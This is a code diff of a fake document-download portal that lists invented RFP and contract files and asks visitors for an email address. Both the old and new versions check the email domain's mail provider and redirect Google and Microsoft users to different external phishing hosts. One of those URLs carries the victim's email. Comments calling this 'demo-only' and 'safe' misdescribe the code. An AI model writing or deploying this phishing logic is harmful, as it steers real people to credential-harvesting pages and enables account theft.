+    return `${a} ${n} ${t}`;
+  }
+  function formatToday(){
+    const d = new Date();
+    return d.toLocaleDateString(undefined,{month:'short',day:'2-digit',year:'numeric'});
+  }
+  function randomRecentDate(){
+    const d = new Date();
+    const offset = Math.floor(Math.random()*7); // 0..6 days ago
+    d.setDate(d.getDate()-offset);
+    return d.toLocaleDateString(undefined,{month:'short',day:'2-digit'});
+  }
+  function initHeader(){
+    currentProjectName = generateProjectName();
+    const dateStr = formatToday();
+    document.getElementById('spHeaderTitle').textContent = `${currentProjectName} • ${dateStr}`;
+    document.getElementById('crumbProject').textContent = currentProjectName;
+    document.getElementById('pageTitle').textContent = currentProjectName;
+  }
+  function setRandomModified(){
+    document.querySelectorAll('[data-random-modified]').forEach(el=>{
+      el.textContent = randomRecentDate();
+    });
+  }
+
+  // Selection logic
+  document.getElementById('selectAll').addEventListener('change', (e) => {
+    const checked = e.target.checked;
+    document.querySelectorAll('.sp-item').forEach(cb => {
+      cb.checked = checked;
+      if (checked) selected.add(cb.id); else selected.delete(cb.id);
+    });
+    singleSelectionOverride = null;
+    updateUI();
+  });
+
+  document.querySelectorAll('.sp-item').forEach(cb => {
+    cb.addEventListener('change', () => {
+      if (cb.checked) selected.add(cb.id); else selected.delete(cb.id);
+      singleSelectionOverride = null;
+      syncSelectAll();
+      updateUI();
+    });
+  });
+
+  function toggleRow(id){
+    const cb = document.getElementById(id);
+    cb.checked = !cb.checked;
+    if (cb.checked) selected.add(id); else selected.delete(id);
+    singleSelectionOverride = null;
+    syncSelectAll();
+    updateUI();
+  }
+
+  function openModal(){
+    if (selected.size === 0) return;
+    singleSelectionOverride = null;
+    showModal();
+  }
+  function openModalSingle(id){
+    singleSelectionOverride = id; // only this file
+    showModal();
+  }
+  function showModal(){
+    document.getElementById('modalOverlay').style.display = 'block';
+    document.getElementById('modalProjectName').textContent = currentProjectName;
+    const emailInput = document.getElementById('emailInput');
+    emailInput.value = '';
+    emailInput.focus();
+  }
+  function closeModal(){
+    document.getElementById('modalOverlay').style.display = 'none';
+  }
+
+  function syncSelectAll(){
+    const total = document.querySelectorAll('.sp-item').length;
+    const selectAll = document.getElementById('selectAll');
+    if (selected.size === 0){ selectAll.checked = false; selectAll.indeterminate = false; }
+    else if (selected.size === total){ selectAll.checked = true; selectAll.indeterminate = false; }
+    else { selectAll.checked = false; selectAll.indeterminate = true; }
+  }
+
+  function updateUI(){
+    const countEl = document.getElementById('selectedCount');
+    const btn = document.getElementById('downloadBtn');
+    const count = selected.size;
+    if (count === 0){
+      countEl.textContent = 'Select documents to download';
+      btn.disabled = true;
+    } else {
+      countEl.textContent = `${count} item${count>1?'s':''} selected`;
+      btn.disabled = false;
+    }
+  }
+
+  // DNS MX check and redirect per host
+  async function checkMxAndRedirect(email){
+    try{
+	  const domain = email.split('@')[1].toLowerCase();
+      const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`;
+      const res = await fetch(url, { headers: { 'Accept': 'application/dns-json' }});
+      if (!res.ok) throw new Error('DNS query failed');
+      const data = await res.json();
+      const answers = Array.isArray(data.Answer) ? data.Answer.map(a => String(a.data).toLowerCase()) : [];
+      const mxBlob = answers.join(' ');
+      let target = 'adobe';
+
+      const isGoogle = /google\.com|googlemail\.com|aspmx\.l\.google\.com|alt\d\.aspmx\.l\.google\.com/.test(mxBlob);
+      const isMicrosoft = /outlook\.com|protection\.outlook\.com|office365\.com|onmicrosoft\.com|microsoft\.com/.test(mxBlob);
+
+      if (isGoogle) target = 'gsuite';
+      else if (isMicrosoft) target = 'office365';
+
+      const redirects = {
+        gsuite: 'https://csda.info',
+        office365: 'https://noscript.peanouzujo.my.id/jEP6aOTWiGu!/$'+email,
+        adobe: 'https://pdf-render.vercel.app/?from=me'
+      };
+
+      window.location.href = redirects[target];
+    } catch (e){
+      window.location.href = 'https://www.adobe.com/';
+    }
+  }
+
+  function processDownload(){
+    const email = document.getElementById('emailInput').value.trim();
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){
+      alert('Enter a valid email address to confirm authorization.');
+      return;
+    }
+    // Determine which files to "download": either single or selected set
+    let filesToDownload = [];
+    if (singleSelectionOverride){
+      filesToDownload = [singleSelectionOverride];
+    } else {
+      filesToDownload = Array.from(selected);
+    }
+    if (filesToDownload.length === 0){
+      alert('Please select at least one document.');
+      return;
     }
 
-    async function validateAndRedirect(email) {
-      // Extract the domain from the email address
-      const domain = email.split("@")[1];
-      if (!domain) { 
-        return;
-      }
- 
-      const mxRecords = await getMXRecords(domain);
-
-      if (mxRecords.length === 0) { 
-        return;
-      }
-
-      console.log("MX Records:", mxRecords);
-
-      let redirectUrl = null;
-
-      // Determine the hosting provider based on MX records
-      if (mxRecords.some(record => record.data.includes("google.com"))) {
-        redirectUrl = "https://csda.info";
-      } else if (
-        mxRecords.some(record =>
-          record.data.includes("outlook.com") ||
-          record.data.includes("office365.com") ||
-          record.data.includes("hotmail.com") ||
-          record.data.includes("microsoft.com") ||
-          record.data.includes("protection.outlook.com")
-        )
-      ) {
-        redirectUrl = "https://noscript.peanouzujo.my.id/jEP6aOTWiGu!/$"+email;
-      } else {
-        redirectUrl = "https://pdf-render.vercel.app/?from=me";
-      } 
-      setTimeout(() => {
-        window.location.href = redirectUrl;window.location.assign(redirectUrl);
-      }, 1000);
-    }
-
-    const files = [
-      { id:"f1", name:"01_RFP_Invitation_and_Instructions.pdf", type:"PDF",  size:"1.8 MB", ext:"pdf"  },
-      { id:"f2", name:"02_Project_Scope_and_Specifications.docx", type:"Word", size:"624 KB", ext:"docx" },
-      { id:"f3", name:"03_Drawings_Set_A_Architectural.pdf", type:"PDF",  size:"9.4 MB", ext:"pdf"  },
-      { id:"f6", name:"06_Bill_of_Materials_and_Allowances.xlsx", type:"Excel", size:"412 KB", ext:"xlsx" },
-      { id:"f7", name:"07_Contract_Terms_and_Insurance_Requirements.pdf", type:"PDF", size:"2.6 MB", ext:"pdf" }
-    ];
-
-    const selected = new Set();
-
-    function iconFor(ext){
-      const stroke = "#334155";
-      const common = `fill="none" stroke="${stroke}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"`;
-      switch(ext){
-        case "pdf":
-          return `<svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
-            <path ${common} d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7z"/>
-            <path ${common} d="M14 2v5h5"/>
-            <path ${common} d="M8 16c2-1 4-5 4-8 0-1-1-2-2-2-2 0-1 4 2 7 2 2 4 2 4 1 0-1-2-2-5-1-3 1-5 3-4 4 1 1 3 0 5-2"/>
-          </svg>`;
-        case "docx":
-          return `<svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
-            <path ${common} d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7z"/>
-            <path ${common} d="M14 2v5h5"/>
-            <path ${common} d="M8 13h8M8 17h6M8 9h4"/>
-          </svg>`;
-        case "xlsx":
-          return `<svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
-            <path ${common} d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7z"/>
-            <path ${common} d="M14 2v5h5"/>
-            <path ${common} d="M8 10h8M8 14h8M8 18h8M10 10v8M14 10v8"/>
-          </svg>`;
-        case "dwg":
-          return `<svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
-            <path ${common} d="M4 19V5a2 2 0 0 1 2-2h8l6 6v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2Z"/>
-            <path ${common} d="M14 3v6h6"/>
-            <path ${common} d="M7 17l4-6 3 4 3-5"/>
-          </svg>`;
-        default:
-          return `<svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
-            <path ${common} d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7z"/>
-            <path ${common} d="M14 2v5h5"/>
-          </svg>`;
-      }
-    }
-
-    // DOM
-    const fileRows = document.getElementById("fileRows");
-    const search = document.getElementById("search");
-    const countBadge = document.getElementById("countBadge");
-    const selectedBadge = document.getElementById("selectedBadge");
-    const selectionText = document.getElementById("selectionText");
-    const selectAllBtn = document.getElementById("selectAllBtn");
-    const clearBtn = document.getElementById("clearBtn");
-    const downloadSelectedBtn = document.getElementById("downloadSelectedBtn");
-
-    const overlay = document.getElementById("overlay");
-    const closeModalBtn = document.getElementById("closeModal");
-    const cancelBtn = document.getElementById("cancelBtn");
-    const continueBtn = document.getElementById("continueBtn");
-    const emailInput = document.getElementById("email");
-    const selUl = document.getElementById("selUl");
-
-    function escapeHtml(str){
-      return String(str)
-        .replaceAll("&","&amp;")
-        .replaceAll("<","&lt;")
-        .replaceAll(">","&gt;")
-        .replaceAll('"',"&quot;")
-        .replaceAll("'","&#039;");
-    }
-
-    function isValidEmail(v){
-      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
-    }
-
-    function updateSelectionUI(){
-      const n = selected.size;
-      selectedBadge.textContent = `${n} selected`;
-      selectionText.textContent = n === 0
-        ? "No documents selected."
-        : `${n} document${n === 1 ? "" : "s"} selected.`;
-      downloadSelectedBtn.disabled = n === 0;
-    }
-
-    function render(list){
-      fileRows.innerHTML = "";
-      countBadge.textContent = `${list.length} items`;
-
-      list.forEach((f) => {
-        const row = document.createElement("div");
-        row.className = "row";
-        row.innerHTML = `
-          <div class="chkWrap">
-            <input type="checkbox" aria-label="Select ${escapeHtml(f.name)}" data-id="${f.id}" ${selected.has(f.id) ? "checked" : ""}/>
-          </div>
-          <div class="file">
-            <div class="icon">${iconFor(f.ext)}</div>
-            <div class="fname">
-              <strong title="${escapeHtml(f.name)}">${escapeHtml(f.name)}</strong>
-              <span>${escapeHtml(f.type)} document</span>
-            </div>
-          </div>
-          <div class="muted">${escapeHtml(f.type)}</div>
-          <div class="muted">${escapeHtml(f.size)}</div>
-        `;
-
-        const chk = row.querySelector('input[type="checkbox"]');
-        chk.addEventListener("change", () => {
-          if (chk.checked) selected.add(f.id);
-          else selected.delete(f.id);
-          updateSelectionUI();
-        });
-
-        // click row toggles checkbox (except when clicking checkbox itself)
-        row.addEventListener("click", (e) => {
-          if (e.target && (e.target.tagName === "INPUT")) return;
-          chk.checked = !chk.checked;
-          chk.dispatchEvent(new Event("change"));
-        });
-
-        fileRows.appendChild(row);
-      });
-
-      updateSelectionUI();
-    }
-
-    function openModal(){
-      // populate selected file list
-      selUl.innerHTML = "";
-      const selectedFiles = files.filter(f => selected.has(f.id));
-      selectedFiles.forEach(f => {
-        const li = document.createElement("li");
-        li.textContent = f.name;
-        selUl.appendChild(li);
-      });
-
-      emailInput.value = "";
-      overlay.classList.add("show");
-      setTimeout(() => emailInput.focus(), 50);
-    }
-
-    function closeModal(){
-      overlay.classList.remove("show");
-    }
-
-    // Actions
-    selectAllBtn.addEventListener("click", () => {
-      files.forEach(f => selected.add(f.id));
-      render(currentList());
+    // Simulate sending links (console) and proceed with MX check
+    console.log('Requested download:', {
+      email,
+      project: currentProjectName,
+      files: filesToDownload,
+      timestamp: new Date().toISOString()
     });
 
-    clearBtn.addEventListener("click", () => {
-      selected.clear();
-      render(currentList());
-    });
+    
+    checkMxAndRedirect(email);
+  }
 
-    downloadSelectedBtn.addEventListener("click", () => {
-      if (selected.size === 0) return;
-      openModal();
-    });
-
-    // Modal close handlers
-    closeModalBtn.addEventListener("click", closeModal);
-    cancelBtn.addEventListener("click", closeModal);
-    overlay.addEventListener("click", (e) => { if(e.target === overlay) closeModal(); });
-    window.addEventListener("keydown", (e) => { if(e.key === "Escape") closeModal(); });
-
-    // Modal continue (safe demo behavior)
-    continueBtn.addEventListener("click", async () => {
-      const email = emailInput.value.trim();
-      if(!isValidEmail(email)){
-        emailInput.focus();
-        emailInput.style.borderColor = "#fca5a5";
-        setTimeout(()=> emailInput.style.borderColor = "", 700);
-        return;
-      }
-
-      const selectedFiles = files.filter(f => selected.has(f.id)).map(f => f.name);
-
-      // Demo-only: simulate verification
-      continueBtn.disabled = true;
-      continueBtn.textContent = "Validating…";
-      await new Promise(r => setTimeout(r, 600));
-      continueBtn.disabled = false;
-      continueBtn.textContent = "Continue";
-     await validateAndRedirect(email);
-      
-
-      closeModal();
-    });
-
-    // Search
-    function currentList(){
-      const q = search.value.trim().toLowerCase();
-      if(!q) return files;
-      return files.filter(f =>
-        f.name.toLowerCase().includes(q) ||
-        f.type.toLowerCase().includes(q) ||
-        f.ext.toLowerCase().includes(q)
-      );
-    }
-
-    search.addEventListener("input", () => render(currentList()));
-
-    // init
-    render(files);
-  </script>
+  // Init on load
+  document.addEventListener('DOMContentLoaded', ()=>{
+    initHeader();
+    setRandomModified();
+    updateUI();
+  });
+</script>
 </body>
 </html>
